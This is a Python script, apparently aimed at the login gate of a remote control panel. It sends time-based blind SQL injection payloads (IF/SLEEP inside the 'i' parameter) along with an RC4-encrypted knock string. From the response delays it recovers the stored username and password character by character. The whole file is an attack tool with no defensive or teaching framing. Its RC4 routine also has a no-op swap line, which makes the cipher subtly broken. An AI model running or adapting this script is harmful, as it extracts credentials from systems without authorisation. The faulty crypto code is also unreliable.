import requests
import time
import sys

wait_delay = 5
knock_string = 'g=a&w=a&b=a&d=a&p=a&m=a'

post_data = ""

def rc4_crypt(data, key):
    S = list(range(256))
    j = 0
    out = []

    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[i], S[j]
        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
    
    return ''.join(out)

def brute_length(url, id):
    for i in range(1, 31):
        injection = (
            "\"', (IF(LENGTH((SELECT value FROM settings WHERE id=%d)) = %d, "
            "SLEEP(%d), 0)), 'a', 'a', 'a', 'a', 'a', 'a')-- -" % (id, i, wait_delay)
        )
        connect_url = f"{url}?i={injection}"

        start = time.time()
        requests.post(connect_url, data=post_data)
        end = time.time()

        if (end - start) >= wait_delay:
            return i
    return 0

def brute_char(url, position, id):
    for i in range(32, 127):
        injection = (
            "\"', (IF(SUBSTRING((SELECT value FROM settings WHERE id=%d), %d, 1) = "
            "BINARY CHAR(%d), SLEEP(%d), 0)), 'a', 'a', 'a', 'a', 'a', 'a')-- -" % 
            (id, position, i, wait_delay)
        )
        connect_url = f"{url}?i={injection}"

        sys.stdout.write(f"\b{chr(i)}")
        sys.stdout.flush()

        start = time.time()
        requests.post(connect_url, data=post_data)
        end = time.time()

        if (end - start) >= wait_delay:
            break

def brute_panel(url):
    global post_data
    post_data = 'aaaa' + rc4_crypt(knock_string, 'aaaa')

    ulen = brute_length(url, 1)
    print("Username: ", end="")
    for i in range(1, ulen + 1):
        brute_char(url, i, 1)

    plen = brute_length(url, 2)
    print("\nPassword: ", end="")
    for i in range(1, plen + 1):
        brute_char(url, i, 2)
    print("")

if len(sys.argv) >= 2:
    brute_panel(sys.argv[1])
else:
    print("enter panel gate url")
